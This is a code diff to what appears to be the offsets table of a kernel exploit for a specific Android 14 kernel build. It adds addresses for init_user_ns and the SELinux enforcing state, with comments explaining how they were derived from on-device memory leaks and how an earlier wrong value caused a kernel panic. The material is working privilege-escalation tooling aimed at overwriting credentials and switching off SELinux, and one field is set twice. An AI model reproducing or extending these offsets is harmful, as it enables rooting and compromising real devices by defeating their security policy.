@@ -17,6 +17,23 @@ OFFSETS_ENTRY("5.15.170-android14-11-gf4a1f03072af",
 
   .off_init_task          = 0x0120BAC0ULL,
   .off_init_cred          = 0x0121C558ULL,
+  .off_init_user_ns       = 0x0121B080ULL,  /* REFERENCE vmlinux (clang-22/LTO_NONE) - NOT device-valid; storm/diagnostic only */
+  .off_selinux_enforcing_device = 0x01C08F30ULL, /* device .bss pair-verified (selinux_state = selinux_avc + 0x1828) */
+  .off_init_user_ns_device = 0x019EB898ULL, /* OBSERVED on-device &init_user_ns = anchor+0x19EB898. Previous 0x19EB080 (boot-log .data start + reference in-.data offset) is 0x818 too low; that wrong ns is not an ancestor of targ_ns and its ->level is negative, so cap_capable() walks ns->parent off the top (init_user_ns->parent==NULL) and NULL-derefs -> kernel panic. */
+  /* DEVICE selinux_state, anchor-relative - DERIVED FROM THE OBSERVED
+   * avc/state PAIR, verified on device across multiple boots/storms:
+   *   reference: selinux_avc  .bss+0x3FEA0 (0x9377ea8)
+   *              selinux_state .bss+0x416C8 (0x93796d0)
+   *              delta = 0x1828 EXACTLY
+   *   device:    leak candidates anchor+0x1C07708 and anchor+0x1C08F30
+   *              delta = 0x1828 EXACTLY (identical pair geometry)
+   *              both shifted +0x1060 from their reference .bss positions
+   *   -> selinux_avc = anchor+0x1C07708, selinux_state = anchor+0x1C08F30.
+   * The .bss prefix's internal layout is preserved by ThinLTO (whole
+   * prefix shifted +0x1060). The naive boot-log derivation (0x1C07ED0)
+   * missed the +0x1060 shift and landed inside selinux_avc (an empty
+   * avc_cache bucket - survived, but enforce stayed 1). */
+  .off_selinux_enforcing_device = 0x01C08F30ULL,
   .off_init_uts_ns        = 0x0120A7E8ULL,
   .off_empty_zero_page    = 0x01339000ULL,
   .off_root_task_group    = 0x0133FF40ULL,
